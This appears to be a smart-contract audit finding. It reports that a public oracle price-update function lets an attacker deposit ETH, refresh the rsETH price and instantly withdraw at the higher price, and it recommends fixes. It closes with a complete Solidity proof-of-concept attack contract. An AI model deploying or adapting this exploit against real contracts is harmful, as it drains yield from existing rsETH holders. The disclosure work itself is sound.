### Title
Oracle Price Sandwich via Public `updateRSETHPrice()` and `instantWithdrawal()` Enables Yield Theft - (File: contracts/LRTOracle.sol, contracts/LRTWithdrawalManager.sol)

---

### Summary

`LRTOracle.updateRSETHPrice()` is a permissionless public function. `LRTWithdrawalManager.instantWithdrawal()` prices the redemption using the stored `rsETHPrice` at execution time. An attacker can atomically: (1) deposit ETH at the stale pre-update price, (2) call `updateRSETHPrice()` to reflect accumulated rewards, and (3) immediately redeem at the higher post-update price — capturing yield that belongs to existing rsETH holders.

---

### Finding Description

`LRTOracle.updateRSETHPrice()` is declared `public` with no access restriction:

```solidity
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
``` [1](#0-0) 

The stored `rsETHPrice` is the sole pricing source for both deposits and instant withdrawals. `LRTDepositPool.getRsETHAmountToMint()` computes:

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [2](#0-1) 

`LRTWithdrawalManager.getExpectedAssetAmount()` computes:

```solidity
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
``` [3](#0-2) 

`instantWithdrawal()` calls `getExpectedAssetAmount()` at execution time using the live stored price, then immediately redeems from the unstaking vault:

```solidity
uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
...
unstakingVault.redeem(asset, assetAmountUnlocked);
``` [4](#0-3) 

Between two consecutive `updateRSETHPrice()` calls, staking and restaking rewards accumulate in the protocol. The stored `rsETHPrice` is stale relative to the true NAV. Because `updateRSETHPrice()` is permissionless, an attacker can control exactly when the price is refreshed.

The attack sequence, executable atomically in a single transaction:

1. **Deposit ETH** via `LRTDepositPool.depositETH()` at the stale (lower) `rsETHPrice` → receive more rsETH than the true NAV warrants.
2. **Call `LRTOracle.updateRSETHPrice()`** → `rsETHPrice` increases to reflect accumulated rewards.
3. **Approve and call `LRTWithdrawalManager.instantWithdrawal()`** → burn rsETH at the new (higher) price → receive more ETH than was deposited.

The price update logic in `_updateRsETHPrice()` computes the new price as `(totalETHInProtocol - protocolFeeInETH) / rsETHSupply`: [5](#0-4) 

The attacker's deposit increases both numerator and denominator proportionally at the old price, so the price increase from accumulated rewards is preserved. The attacker then redeems at the higher price, extracting the yield delta.

---

### Impact Explanation

**High — Theft of unclaimed yield.**

Accumulated staking and EigenLayer restaking rewards that have not yet been reflected in `rsETHPrice` are captured by the attacker rather than distributed to existing rsETH holders via price appreciation. The profit per attack equals approximately:

```
profit ≈ depositAmount × (newPrice - oldPrice) / oldPrice − instantWithdrawalFee
```

With sufficient capital and a meaningful reward accrual window (e.g., hours to days between price updates), the absolute profit can be significant. The attack is repeatable every time rewards accumulate.

---

### Likelihood Explanation

**Medium.** Three conditions must hold simultaneously:

1. `isInstantWithdrawalEnabled[asset]` is `true` — set by the manager as a supported protocol feature.
2. The unstaking vault holds sufficient assets for instant redemption.
3. The accumulated reward delta exceeds the `instantWithdrawalFee` (max 10%, typically much lower).

Condition 1 is a deliberate protocol feature. Conditions 2 and 3 are routinely satisfied during normal operation. The attack requires no privileged access, no front-running of another user's transaction, and no external oracle compromise — the attacker fully controls all three steps.

---

### Recommendation

1. **Refresh price before deposit and withdrawal**: Call `_updateRsETHPrice()` (or an equivalent internal snapshot) at the start of `depositETH()` and `instantWithdrawal()` so both operations use the same up-to-date price within the same block.
2. **Minimum holding period for instant withdrawal**: Require that rsETH used in `instantWithdrawal()` was not minted in the same block (e.g., track a `mintBlock` per user).
3. **Slippage guard on instant withdrawal**: Accept a `minAssetAmountExpected` parameter in `instantWithdrawal()` and revert if the computed payout exceeds a caller-specified bound, preventing the attacker from profiting from a price jump they triggered.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface IDepositPool {
    function depositETH(uint256 minRSETHAmountExpected, string calldata referralId) external payable;
}
interface IOracle {
    function updateRSETHPrice() external;
}
interface IWithdrawalManager {
    function instantWithdrawal(address asset, uint256 rsETHUnstaked, string calldata referralId) external;
}
interface IRSETH {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract OracleSandwichAttack {
    address constant ETH_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function attack(
        address depositPool,
        address oracle,
        address withdrawalManager,
        address rsETH
    ) external payable {
        // Step 1: Deposit at stale (pre-update) rsETHPrice — receive more rsETH than true NAV
        IDepositPool(depositPool).depositETH{value: msg.value}(0, "");

        // Step 2: Trigger price update — rsETHPrice increases to reflect accumulated rewards
        IOracle(oracle).updateRSETHPrice();

        // Step 3: Approve and instantly withdraw at the new higher price
        uint256 rsETHBalance = IRSETH(rsETH).balanceOf(address(this));
        IRSETH(rsETH).approve(withdrawalManager, rsETHBalance);
        IWithdrawalManager(withdrawalManager).instantWithdrawal(ETH_TOKEN, rsETHBalance, "");

        // Profit: address(this).balance > msg.value (after instantWithdrawalFee)
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

The attacker deposits `msg.value` ETH, triggers the oracle update in the same transaction, and redeems at the higher post-update price. The net ETH received exceeds the ETH deposited by the reward delta minus the instant withdrawal fee, with the difference extracted from yield owed to existing rsETH holders.
